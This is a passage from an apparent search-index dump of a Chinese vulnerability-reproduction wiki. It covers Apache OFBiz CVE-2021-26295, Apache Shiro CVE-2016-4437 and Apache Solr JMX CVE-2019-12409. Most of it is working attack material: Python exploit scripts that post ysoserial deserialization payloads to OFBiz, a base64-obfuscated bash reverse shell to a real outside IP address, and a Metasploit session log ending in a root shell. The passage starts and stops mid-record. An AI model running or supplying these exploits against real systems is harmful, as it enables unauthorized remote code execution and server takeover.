[36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def trans ( s ): return \" %s \" % '' . join ( ' %.2x ' % x for x in s ) def POC_1 ( target_url , Dnslog ): popen = subprocess . Popen ([ 'java' , '-jar' , 'ysoserial.jar' , \"URLDNS\" , Dnslog ], stdout = subprocess . PIPE ) data = popen . stdout . read () hex_data = trans ( data ) headers = { 'Content-Type' : 'text/xml' } post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"><peiqi:cus-obj> %s </peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = post_data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /webtools/control/SOAPService..... \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [36m[o] \u8bf7\u68c0\u67e5 Dnslog \u54cd\u5e94 \\n \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog ) [!NOTE] \u53cd\u5f39shell\u811a\u672c import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache OFBiz \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mHex_data >>> \u5728\u6587\u4ef6\u4e2d\u4fee\u6539 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Dnslog ): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type' : 'text/xml' } post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"><peiqi:cus-obj> %s </peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = post_data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /webtools/control/SOAPService..... \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [36m[o] \u8bf7\u68c0\u67e5 \u76d1\u542c\u5730\u5740 \u54cd\u5e94 \\n \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog )","title":"Apache OFBiz RMI\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2021-26295"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#apache-ofbiz-rmi\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-cve-2021-26295","text":"","title":"Apache OFBiz rmi\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2021-26295"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#\u6f0f\u6d1e\u63cf\u8ff0","text":"OFBiz\u662f\u57fa\u4e8eJava\u7684Web\u6846\u67b6\uff0c\u5305\u62ec\u5b9e\u4f53\u5f15\u64ce\uff0c\u670d\u52a1\u5f15\u64ce\u548c\u57fa\u4e8e\u5c0f\u90e8\u4ef6\u7684UI\u3002 \u8fd1\u65e5\uff0cApache OFBiz\u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u3002Apache OFBiz \u5b58\u5728RMI\u53cd\u5e8f\u5217\u5316\u524d\u53f0\u547d\u4ee4\u6267\u884c\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u6f0f\u6d1e\u6765\u6210\u529f\u63a5\u7ba1Apache OFBiz\uff0c\u5efa\u8bae\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u6d4b\u8bd5\u6f0f\u6d1e\u4fee\u590d\u7684\u7248\u672c\u5e76\u53ca\u65f6\u5347\u7ea7\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache OFBiz < 17.12.06","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#fofa","text":"[!NOTE] app=\"Apache_OFBiz\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#\u73af\u5883\u642d\u5efa","text":"docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528\u6587\u7ae0\u76ee\u5f55\u4e2d\u7684POC\u811a\u672c \u9a8c\u8bc1 Dnslog \u53cd\u5f39shell\u4f7f\u7528 ROME\u53cd\u5e8f\u5217\u5316\u94fe\u5c31\u884c\u4e86 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i &>/dev/tcp/81.68.139.186/9999 <&1' base64\u52a0\u5bc6\u5199\u5165\u7136\u540e\u6267\u884c\u547d\u4ee4 \u7136\u540e\u628a\u6570\u636e\u586b\u5165\u4e0b\u9762\u7684 \u53cd\u5f39shell\u811a\u672c\u4e2d\u7684Hex_data\u53c2\u6570\u4e2d\u8fd0\u884c\u811a\u672c\u5373\u53ef\u53cd\u5f39shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u9700\u8981\u5c06POC\u653e\u5728\u4e0e ysoserial.jar \u540c\u4e00\u76ee\u5f55 \u4e00\u4e2a\u4e3a dnslog\u68c0\u6d4b\uff0c\u53e6\u4e00\u4e2a\u4e3a\u53cd\u5f39shell import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache OFBiz \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def trans ( s ): return \" %s \" % '' . join ( ' %.2x ' % x for x in s ) def POC_1 ( target_url , Dnslog ): popen = subprocess . Popen ([ 'java' , '-jar' , 'ysoserial.jar' , \"URLDNS\" , Dnslog ], stdout = subprocess . PIPE ) data = popen . stdout . read () hex_data = trans ( data ) headers = { 'Content-Type' : 'text/xml' } post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"><peiqi:cus-obj> %s </peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = post_data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /webtools/control/SOAPService..... \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [36m[o] \u8bf7\u68c0\u67e5 Dnslog \u54cd\u5e94 \\n \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog ) [!NOTE] \u53cd\u5f39shell\u811a\u672c import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache OFBiz \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mHex_data >>> \u5728\u6587\u4ef6\u4e2d\u4fee\u6539 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Dnslog ): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type' : 'text/xml' } post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi=\"http://ofbiz.apache.org/service/\"><peiqi:cus-obj> %s </peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = post_data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /webtools/control/SOAPService..... \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [36m[o] \u8bf7\u68c0\u67e5 \u76d1\u542c\u5730\u5740 \u54cd\u5e94 \\n \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , Dnslog )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/","text":"Apache Shiro <=1.2.4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2016-4437 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Shiro\u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u5b66\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002Shiro\u6846\u67b6\u76f4\u89c2\u3001\u6613\u7528\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u4f9b\u5065\u58ee\u7684\u5b89\u5168\u6027\u3002 Apache Shiro 1.2.4\u53ca\u4ee5\u524d\u7248\u672c\u4e2d\uff0c\u52a0\u5bc6\u7684\u7528\u6237\u4fe1\u606f\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u5728\u540d\u4e3aremember-me\u7684Cookie\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Shiro\u7684\u9ed8\u8ba4\u5bc6\u94a5\u4f2a\u9020\u7528\u6237Cookie\uff0c\u89e6\u53d1Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdb\u800c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Shiro <= 1.2.4 \u6f0f\u6d1e\u73af\u5883 \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d \u8bbf\u95ee** http://xxx.xxx.xxx.xxx:8080/login **\u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 Shiro\u5df2\u7ecf\u6709\u6bd4\u8f83\u5b8c\u5584\u7684\u5de5\u5177 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 \u8fd9\u91cc\u4f7f\u7528\u7684\u662f ShiroExploit \u5de5\u5177\u8fdb\u884c\u590d\u73b0 \u6253\u5f00\u540e\u8f93\u5165url\u5373\u53ef \u6210\u529f\u53cd\u5f39shell \u53c2\u8003\u6587\u7ae0 \u00b6 Shiro RememberMe 1.2.4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-\u8be6\u7ec6\u5206\u6790","title":"Apache Shiro \u5c0f\u4e8e1.2.4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2016-4437"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#apache-shiro-124\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-cve-2016-4437","text":"","title":"Apache Shiro &lt;=1.2.4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2016-4437"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Shiro\u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u5b66\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002Shiro\u6846\u67b6\u76f4\u89c2\u3001\u6613\u7528\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u4f9b\u5065\u58ee\u7684\u5b89\u5168\u6027\u3002 Apache Shiro 1.2.4\u53ca\u4ee5\u524d\u7248\u672c\u4e2d\uff0c\u52a0\u5bc6\u7684\u7528\u6237\u4fe1\u606f\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u5728\u540d\u4e3aremember-me\u7684Cookie\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Shiro\u7684\u9ed8\u8ba4\u5bc6\u94a5\u4f2a\u9020\u7528\u6237Cookie\uff0c\u89e6\u53d1Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdb\u800c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Shiro <= 1.2.4","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#\u6f0f\u6d1e\u73af\u5883","text":"https://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d \u8bbf\u95ee** http://xxx.xxx.xxx.xxx:8080/login **\u6b63\u5e38\u5373\u53ef","title":"\u6f0f\u6d1e\u73af\u5883"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#\u6f0f\u6d1e\u590d\u73b0","text":"Shiro\u5df2\u7ecf\u6709\u6bd4\u8f83\u5b8c\u5584\u7684\u5de5\u5177 https://github.com/insightglacier/Shiro_exploit https://github.com/feihong-cs/ShiroExploit/releases/tag/v2.51 \u8fd9\u91cc\u4f7f\u7528\u7684\u662f ShiroExploit \u5de5\u5177\u8fdb\u884c\u590d\u73b0 \u6253\u5f00\u540e\u8f93\u5165url\u5373\u53ef \u6210\u529f\u53cd\u5f39shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Shiro/Apache%20Shiro%20%E5%B0%8F%E4%BA%8E1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2016-4437/#\u53c2\u8003\u6587\u7ae0","text":"Shiro RememberMe 1.2.4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-\u8be6\u7ec6\u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/","text":"Apache Solr JMX\u670d\u52a1 RCE CVE-2019-12409 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Java ManagementExtensions\uff08JMX\uff09\u662f\u4e00\u79cdJava\u6280\u672f\uff0c\u4e3a\u7ba1\u7406\u548c\u76d1\u89c6\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u5bf9\u8c61\u3001\u8bbe\u5907\uff08\u5982\u6253\u5370\u673a\uff09\u548c\u9762\u5411\u670d\u52a1\u7684\u7f51\u7edc\u63d0\u4f9b\u76f8\u5e94\u7684\u5de5\u5177\u3002JMX \u4f5c\u4e3a Java\u7684\u4e00\u79cdBean\u7ba1\u7406\u673a\u5236\uff0c\u5982\u679cJMX\u670d\u52a1\u7aef\u53e3\u66b4\u9732\uff0c\u90a3\u4e48\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u8ba9\u8be5\u670d\u52a1\u5668\u8fdc\u7a0b\u52a0\u8f7d\u6076\u610f\u7684Bean\u6587\u4ef6\uff0c\u968f\u7740Bean\u7684\u6ee5\u7528\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 \u73af\u5883\u642d\u5efa \u00b6 \u4e0b\u8f7d Apache Solr 8.2.0 \u4e5f\u53ef\u4ee5docker\u642d\u5efa docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u67e5\u770b\u642d\u5efa\u7684Solr\u662f\u5426\u5b58\u5728\u6f0f\u6d1e,\u67e5\u770bsolr.in.sh\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ENABLE_REMOTE_JMX_OPTS\u9009\u9879\u8bbe\u7f6e\u662f\u5426\u4e3a\u201cTure\u201d\uff0c\u5982\u679c\u4e3aTure\uff0c\u5219\u5b58\u5728\u6f0f\u6d1e \u67e5\u770b\u6f0f\u6d1e\u7aef\u53e318983\u662f\u5426\u5f00\u653e [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/\u684c\u9762# msfconsole , , / \\ (( __---,,,---__ )) ( _ ) O O ( _ ) _________ \\ _ / | \\ o_o \\ M S F | \\ \\ _____ | * || | WW || | || | || | =[ metasploit v5.0.101-dev ] + -- -- =[ 2049 exploits - 1108 auxiliary - 344 post ] + -- -- =[ 562 payloads - 45 encoders - 10 nops ] + -- -- =[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [ * ] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit ( multi/misc/java_jmx_server ) > set rhost 192 .168.51.146 rhost = > 192 .168.51.146 msf5 exploit ( multi/misc/java_jmx_server ) > set rport 18983 rport = > 18983 msf5 exploit ( multi/misc/java_jmx_server ) > set payload java/meterpreter/reverse_tcp payload = > java/meterpreter/reverse_tcp msf5 exploit ( multi/misc/java_jmx_server ) > options Module options ( exploit/multi/misc/java_jmx_server ) : Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192 .168.51.146 yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 18983 yes The target port ( TCP ) SRVHOST 0 .0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0 .0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate ( default is randomly generated ) URIPATH no The URI to use for this exploit ( default is random ) Payload options ( java/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192 .168.51.149 yes The listen address ( an interface may be specified ) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic ( Java Payload ) msf5 exploit ( multi/misc/java_jmx_server ) > run [ * ] Started reverse TCP handler on 192 .168.51.149:4444 [ * ] 192 .168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [ * ] 192 .168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [ * ] 192 .168.51.146:18983 - Sending RMI Header... [ * ] 192 .168.51.146:18983 - Discovering the JMXRMI endpoint... [ + ] 192 .168.51.146:18983 - JMXRMI endpoint on 127 .0.1.1:18983 [ * ] 192 .168.51.146:18983 - Proceeding with handshake... [ + ] 192 .168.51.146:18983 - Handshake with JMX MBean server on 127 .0.1.1:18983 [ * ] 192 .168.51.146:18983 - Loading payload... [ * ] 192 .168.51.146:18983 - Replied to request for mlet [ * ] 192 .168.51.146:18983 - Replied to request for payload JAR [ * ] 192 .168.51.146:18983 - Executing payload... [ * ] 192 .168.51.146:18983 - Replied to request for payload JAR [ * ] Sending stage ( 53944 bytes ) to 192 .168.51.146 [ * ] Meterpreter session 1 opened ( 192 .168.51.149:4444 -> 192 .168.51.146:56234 ) at 2020 -11-05 14 :17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id \u7528\u6237id = 0 ( root ) \u7ec4id = 0 ( root ) \u7ec4 = 0 ( root ) \u6f0f\u6d1e\u4fee\u590d \u00b6 \u5c06solr.in.sh\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ENABLE_REMOTE_JMX_OPTS\u9009\u9879\u8bbe\u7f6e\u4e3afalse\uff0c\u7136\u540e\u91cd\u542fSolr\u670d\u52a1\u3002","title":"Apache Solr JMX\u670d\u52a1 RCE 